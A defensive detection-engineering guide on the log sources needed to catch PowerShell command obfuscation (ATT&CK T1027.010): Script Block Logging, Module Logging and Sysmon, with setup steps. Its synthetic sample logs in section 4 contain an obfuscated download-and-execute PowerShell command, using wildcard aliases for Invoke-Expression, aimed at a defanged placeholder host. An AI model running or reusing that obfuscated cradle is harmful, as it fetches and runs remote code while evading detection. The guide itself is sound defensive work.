# Telemetry & Detection Engineering Guide — T1027.010 (Command Obfuscation)

**Companion to:** "An Obfuscated Tale: From ATT&CK Origin to Detection Today" — Sections 5–6
**Scope:** Three log sources, one technique. This guide covers exactly what you need
enabled to turn T1027.010 (Command Obfuscation) from an invisible technique into a
Monday-morning detection rule.

> **Detection engineering is only as viable as the fuel you give it.** If none of the
> three log sources below are enabled on your endpoints, every Sigma rule in
> `detection/sigma-rules/` is dead on arrival — there's no field for the logic to match
> against.

---

## 0. Why these three, and only these three

T1027.010 exists to catalog obfuscation *of the command itself* — aliases, wildcards,
environment-variable path masking, string concatenation, backtick splitting, case
randomization, special characters — techniques whose entire purpose is to defeat
signature and pattern matching **before** the command ever executes. That has a direct
telemetry consequence: the obfuscated string on disk or on the wire is, by design,
not the string you want to alert on. You need a data source that shows you the
command *after* something has resolved it.

Three sources cover that need, and each covers a gap the others don't:

| Source | Event ID(s) | What it uniquely gives you |
|---|---|---|
| PowerShell Script Block Logging | 4104 | The deobfuscated / reconstructed script text as PowerShell's own parser sees it — the single best place to catch T1027.010 in the act |
| PowerShell Module ("Classic") Logging | 4103 + 4100-series | Pipeline execution detail — which cmdlet actually ran, with bound parameter values, independent of how the caller invoked it |
| Sysmon | 1, 7, 17 | Ground truth for what *process* actually launched, with full command line, regardless of whether PowerShell logging was tampered with, disabled, or bypassed entirely (e.g., obfuscation that never touches the PS engine, like `forfiles`/`cmd` chains) |

No single source is sufficient alone. Script Block Logging is the richest source but is
PowerShell-engine-specific and can be disabled by an attacker with local admin (AMSI/PSL
bypass frameworks target exactly this). Sysmon is process-centric and engine-agnostic,
so it survives PowerShell-logging tampering, but it only sees the invocation command
line — not what the script *did* internally. Module logging sits in between: cheaper
than script block logging, but only as good as the parameter binding it captures.

---

## 1. PowerShell Script Block Logging (Event ID 4104)

### 1.1 What it captures

Script Block Logging records the full text of every block of PowerShell code as it is
**compiled and handed to the PowerShell engine for execution** — not as it was typed or
downloaded. Critically, this happens *after* PowerShell's parser has done its own work:
variable expansion, alias resolution inside the block, and — the part that matters most
for T1027.010 — every time an obfuscated layer decodes or reconstructs a *new* block of
code and hands it to `Invoke-Expression`, `Invoke-Command`, `&`, or `.` (dot-source),
**that reconstructed block gets its own 4104 event.**

This is why Script Block Logging is the single highest-value source for a multi-layer
obfuscation chain like STEEP#MAVERICK's eight-layer stager: you don't have to
reverse-engineer the obfuscation yourself. Each layer un-obfuscates itself at runtime and
that plaintext lands in the log, layer by layer, as a separate `ScriptBlockText`.

Practical detail: large script blocks are split across multiple 4104 events
(`MessageNumber`/`MessageTotal` in the raw event), and PowerShell assigns a
`ScriptBlockId` (GUID) that ties related fragments together and — since PS 5.1 — links
to the correlating 4103 module-logging events for the same pipeline execution.

### 1.2 Why it matters for T1027.010 specifically

T1027.010 explicitly names alias abuse, wildcard cmdlet resolution, environment-variable
masking, string concatenation, and special-character insertion as in-scope obfuscation
methods. Every one of those techniques is a *source-text* trick — it exists to survive
being read by a human or a naive regex. It does **not** survive being read by the
PowerShell parser, because the parser has to resolve it correctly to run the code at
all. Script Block Logging captures the parser's view. That's the whole advantage: you
are reading the attacker's obfuscation engine's own output, for free, without writing a
deobfuscator.

### 1.3 How to enable it

**Group Policy (domain or local via `gpedit.msc`):**

```
Computer Configuration
  > Policies
    > Administrative Templates
      > Windows Components
        > Windows PowerShell
          > Turn on PowerShell Script Block Logging   -> Enabled
```

Leave **"Log script block invocation start / stop events" unchecked.** It doubles event
volume for no security value in the vast majority of environments and will bury 4104 in
noise on a busy host.

**Registry equivalent (for non-domain hosts / Intune / config management):**

```
HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
    EnableScriptBlockLogging   REG_DWORD   1
    EnableScriptBlockInvocationLogging   REG_DWORD   0   (leave off, see above)
```

PowerShell one-liner (same effect, useful for lab builds / EDR-deployed remediation
scripts):

```powershell
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Force | Out-Null
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 1
```

**Where the events land:** `Applications and Services Logs > Microsoft > Windows >
PowerShell > Operational` (provider `Microsoft-Windows-PowerShell`), Event ID 4104.

**Don't skip this:** the default max size of the PowerShell/Operational channel is far
too small for production use — a single obfuscated loop can fill the default 15–20 MB
allocation in minutes on a busy host, silently rolling your evidence off the front of
the log before your SIEM forwarder ever reads it. Increase the channel size and forward
it:

```powershell
wevtutil sl "Microsoft-Windows-PowerShell/Operational" /ms:1073741824   # 1 GB
```

**Coverage note:** this applies to the built-in Windows PowerShell 5.1 engine. PowerShell
7+ (`pwsh`) writes its equivalent events to a separate
`PowerShellCore/Operational` channel — if your environment runs PowerShell 7 anywhere
(increasingly common on developer and DevOps endpoints), you need Script Block Logging
enabled and forwarding configured for *both* channels or you have a blind spot.

---

## 2. PowerShell Module / "Classic" Logging (Event ID 4103 + 4100-series)

### 2.1 What it captures

Module logging records **pipeline execution details** for the modules you configure it
to watch: the cmdlet or function invoked, and the bound parameter names and values, as
the engine actually executed them — written to Event ID 4103 in the same
`Microsoft-Windows-PowerShell/Operational` channel as Script Block Logging. Alongside
4103, the same channel carries the 4100-series engine-lifecycle events (engine start/stop
and provider/pipeline health events, commonly cited as 4100–4106, with 4105/4106
specifically documented as engine-started/engine-stopped). Treat the lifecycle events as
low-signal-but-useful context — they tell you *when a PowerShell session existed on a
host at all*, which is a cheap sanity check for whether logging gaps are a tampering
indicator or just an idle box.

### 2.2 Why it matters for T1027.010 specifically

4103 is your redundancy layer against Script Block Logging gaps. Because module logging
records what the engine actually *bound and ran* rather than the source text of a block,
it can surface the resolved cmdlet name and parameters even in cases where the source
obfuscation (alias indirection, wildcard resolution) makes the *script text* hard to
grep — you're looking at execution semantics, not source syntax, a second and
differently-shaped view of the same event. It's also useful for catching activity in
hosts where Script Block Logging was toggled off mid-session (common in AMSI/logging
bypass chains) but module logging for `*` was left on, or vice versa — cross-checking
the two closes a real evasion path.

### 2.3 How to enable it

**Group Policy:**

```
Computer Configuration
  > Policies
    > Administrative Templates
      > Windows Components
        > Windows PowerShell
          > Turn on Module Logging   -> Enabled
            Module Names: *          (log all modules — narrower lists create blind spots)
```

**Registry equivalent:**

```
HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging
    EnableModuleLogging   REG_DWORD   1
HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames
    *                     REG_SZ      *
```

```powershell
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -Force | Out-Null
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -Name 'EnableModuleLogging' -Value 1
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames' -Force | Out-Null
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames' -Name '*' -Value '*'
```

**Where the events land:** same channel as above —
`Microsoft-Windows-PowerShell/Operational` — Event ID 4103 (pipeline execution) plus the
4100-series lifecycle events.

**Tuning note:** setting `Module Names` to `*` is the right default for a security build
— it's the only configuration guaranteed not to silently exempt whatever module an
attacker chooses to abuse next. If log volume forces you to narrow it, at minimum keep
`Microsoft.PowerShell.*`, `Microsoft.PowerShell.Security`, and any remoting-related
modules in scope.

---

## 3. Sysmon (Event ID 1 process creation, 7 image load, 17 pipe created)

### 3.1 What it captures

Sysmon (System Monitor, part of Sysinternals) is a kernel-backed Windows service and
driver that logs security-relevant OS events independent of any single application's own
logging — including PowerShell's. In scope for this talk:

- **Event ID 1 — Process Creation:** every new process, with full `CommandLine`, parent
  process (`ParentImage`/`ParentCommandLine`), hashes, and the account context. This is
  your ground truth for *what actually launched a PowerShell process and how* — visible
  even when the payload never generates a single PowerShell-provider log event (e.g., a
  `cmd.exe`/`forfiles.exe` LOLBIN chain that only spawns `powershell.exe` as its final
  step).
- **Event ID 7 — Image (DLL) Load:** modules loaded into a process. Useful for catching
  in-process obfuscation/evasion tooling (reflective loading, AMSI-patch-adjacent DLL
  activity) that never shows up as a new process at all.
- **Event ID 17 — Pipe Created** (paired with 18, Pipe Connected): named pipe creation.
  Named pipes are a common cross-process and C2-framework communication channel; Sysmon
  17/18 is one of the few generally-available data sources for it.

### 3.2 Why it matters for T1027.010 specifically

Script Block Logging and module logging are both **PowerShell-engine features** — they
require the obfuscated code to actually reach the PS interpreter, and they require the
logging feature itself to still be enabled and untampered when it does. Sysmon Event ID
1 doesn't care: it logs the process launch line regardless of what interpreter parses it
next, which means it's your fallback for:

- Obfuscation that launches PowerShell obfuscated **at the command-line-invocation
  level** (e.g., a scheduled task or LOLBIN chain passing an obfuscated
  `-EncodedCommand` string as an argument) — the process command line itself is the
  artifact, and 4104 will only show you the *decoded* payload one hop later, if at all.
- Environments where Script Block Logging has been disabled by an attacker with
  sufficient privilege, or where an in-memory/reflective execution path skips the normal
  script-block pipeline.
- Correlating a PowerShell 4104 event back to *who actually spawned the interpreter and
  from where* — 4104 alone doesn't give you the parent process tree; Sysmon Event ID 1
  does.

Event ID 7 and 17 close narrower but real gaps: fileless obfuscation frameworks that
reflectively load .NET assemblies instead of touching disk, and post-exploitation
tooling that uses named pipes for local IPC or as a C2 transport, respectively — both
patterns show up repeatedly in commodity loaders using the same command-obfuscation
primitives this talk covers (see `detection/sysmon-config-t1027010.xml`, tuned
specifically for the PowerShell-child-process and wildcard-cmdlet-resolution scenarios
that matter here).

### 3.3 How to install and configure

1. **Download** Sysmon from Microsoft Sysinternals (`Sysmon64.exe` / `Sysmon.exe`).
2. **Install with the tuned config** (see `detection/sysmon-config-t1027010.xml` in this
   repo for a config fragment scoped to Event IDs 1/7/17 and tuned for this technique):

   ```
   Sysmon64.exe -accepteula -i detection\sysmon-config-t1027010.xml
   ```

3. **To update the config on an already-installed service** (do this whenever the
   config changes — no reinstall/reboot required):

   ```
   Sysmon64.exe -c detection\sysmon-config-t1027010.xml
   ```

4. **Verify it's running and which config hash is loaded:**

   ```
   Sysmon64.exe -c
   ```

**Where the events land:** `Applications and Services Logs > Microsoft > Windows >
Sysmon > Operational` (provider `Microsoft-Windows-Sysmon`).

**Tuning philosophy used in the shipped config:** Sysmon Event ID 1 on an unfiltered
config is extremely high volume — most of it is noise (routine child processes of
browsers, update agents, etc.). The config fragment in this repo takes an
include-first, PowerShell-and-command-shell-centric approach: it captures full
`CommandLine` unconditionally for `powershell.exe`, `pwsh.exe`, `cmd.exe`,
`forfiles.exe`, `mshta.exe`, `wscript.exe`, `cscript.exe`, `wmic.exe`, `rundll32.exe`,
and `regsvr32.exe` — the LOLBIN set most associated with T1027.010's wildcard/alias
patterns and the wrapper techniques it hides behind — and applies noise-reduction
excludes for known-benign parent/child pairs rather than trying to filter on obfuscation
signatures inside the config itself (that job belongs to the Sigma rules downstream, not
the collection layer — collect broadly for this process set, filter downstream).

---

## 4. Side-by-side: uninstrumented vs. instrumented endpoint

Same event: a laptop executes a STEEP#MAVERICK-style stager delivered via a phishing
lure. The victim process is `powershell.exe`, launched with a wildcard `Get-Alias`
invocation of `Invoke-Expression` against a remote payload
(`hxxp[://]cdn-sync-relay[.]test/lib/mod2.ps1` — placeholder domain,
defanged). All identifiers below are synthetic.

### 4.1 Uninstrumented endpoint — default Windows logging only

No Script Block Logging, no Module Logging, no Sysmon. The only artifact anywhere near
this event is the default **Security log Event ID 4688** (Process Creation), and only if
"Audit Process Creation" was already turned on *and* "Include command line in process
creation events" was separately enabled — neither is a Windows default.

```
Log Name:      Security
Event ID:      4688
Task Category: Process Creation
Level:         Information
Computer:      WKSTN17.contoso-corp.test
New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Creator Process Name: C:\Users\j.alvarez\AppData\Local\Temp\Invoice_ref88213.exe
Process Command Line: -
```

That's it. `Process Command Line: -` — command-line auditing wasn't enabled, so even the
one field that would show the obfuscated invocation is blank. There is no record
anywhere of `Get-Alias`, no record of the wildcard, no record of the URL, no record of
what the script actually did once it started running. A SIEM search for
`Invoke-Expression`, `IEX`, or the payload domain returns **zero results** — not because
the attack didn't touch those strings, but because nothing captured them. This is the
default posture of most unmanaged and a surprising number of managed Windows endpoints.

### 4.2 Instrumented endpoint — SBL + Module Logging + Sysmon enabled

Same execution, same host, same two seconds of wall-clock time. Three independent,
correlatable events land:

**Sysmon Event ID 1 — the process launch, full command line, parent context:**

```
Log Name:      Microsoft-Windows-Sysmon/Operational
Event ID:      1
TimeCreated:   2026-08-11T14:02:07.114Z
Computer:      WKSTN17.contoso-corp.test
Image:         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine:   "powershell.exe" -NoP -W Hidden -Exec Bypass -Command ".(gal ?e[?x])((gal ?rm) 'hxxp[://]cdn-sync-relay[.]test/lib/mod2.ps1')"
ParentImage:   C:\Users\j.alvarez\AppData\Local\Temp\Invoice_ref88213.exe
ParentCommandLine: "Invoice_ref88213.exe"
User:          CONTOSO-CORP\j.alvarez
Hashes:        SHA256=<synthetic-placeholder-hash-not-real>
```

**PowerShell Event ID 4104 — the parser's own view, wildcard resolved:**

```
Log Name:       Microsoft-Windows-PowerShell/Operational
EventID:        4104
TimeCreated:    2026-08-11T14:02:07.209Z
Computer:       WKSTN17.contoso-corp.test
ScriptBlockId:  8f2c1a4e-9b60-4e77-9a15-2d6f0a9b7c31
ScriptBlockText:
  .(gal ?e[?x])((gal ?rm) 'hxxp[://]cdn-sync-relay[.]test/lib/mod2.ps1')
```
(Full excerpt with the resolved alias output and the downstream chain: see
`detection/sample-4104-logs/01-wildcard-getalias-iex.log`.)

**PowerShell Event ID 4103 — pipeline execution, cmdlets actually bound:**

```
Log Name:       Microsoft-Windows-PowerShell/Operational
EventID:        4103
TimeCreated:    2026-08-11T14:02:07.221Z
Computer:       WKSTN17.contoso-corp.test
ContextInfo:    Severity = Informational
                 Host Application = powershell.exe -NoP -W Hidden -Exec Bypass -Command ...
Payload:        CommandInvocation(Get-Alias): "Get-Alias"
                 ParameterBinding(Get-Alias): name="Name"; value="?e[?x]"
                 CommandInvocation(Invoke-RestMethod): "Invoke-RestMethod"
                 ParameterBinding(Invoke-RestMethod): name="Uri"; value="hxxp[://]cdn-sync-relay[.]test/lib/mod2.ps1"
```

Now a single SIEM query on `ScriptBlockText` for `gal` + `[?x]`-style wildcard tokens
near `Invoke-Expression`/`iex`/`Invoke-RestMethod` returns a hit, with the process tree,
the parent binary, the account, and the destination host all correlatable through the
shared timestamp/host/`ScriptBlockId`. That correlated triple — Sysmon 1 + 4104 + 4103 —
is exactly what the Sigma rules in `detection/sigma-rules/` are written against, and
exactly what the live demo in Section 6 walks on stage.

---

## 5. What "properly instrumented" does *not* mean

Enabling all three sources is necessary, not sufficient. Two operational notes worth
saying out loud to a room full of people who will actually go do this Monday morning:

- **Volume.** All three sources, `*` module logging especially, produce meaningfully
  more log volume than most environments budget for. Increase channel retention (see
  §1.3), and make sure your forwarding pipeline (WEF, Sysmon-to-SIEM agent, etc.) isn't
  silently dropping or sampling PowerShell/Operational — it is one of the more commonly
  under-provisioned channels in WEF deployments.
- **Tamper resistance.** All three of these can be disabled or evaded by an attacker
  with sufficient privilege on the box (Script Block Logging toggled off via registry,
  AMSI/logging bypass frameworks, Sysmon service stopped or its driver unloaded).
  Instrumentation is not a substitute for protecting the logging configuration itself —
  registry ACLs on the policy keys, Sysmon service protection (`-o` unload protection,
  restricting local admin), and alerting on absence (a host that stops producing 4104
  events at all after a period of normal activity is itself a signal) all belong in a
  mature detection program built on top of this telemetry.

---

## Sources

Grounding references for the claims in this guide are cited inline throughout —
primarily the MITRE ATT&CK T1027.010 page, Microsoft's PowerShell/Sysmon logging
documentation, and the Sigma project's own rule-writing conventions.
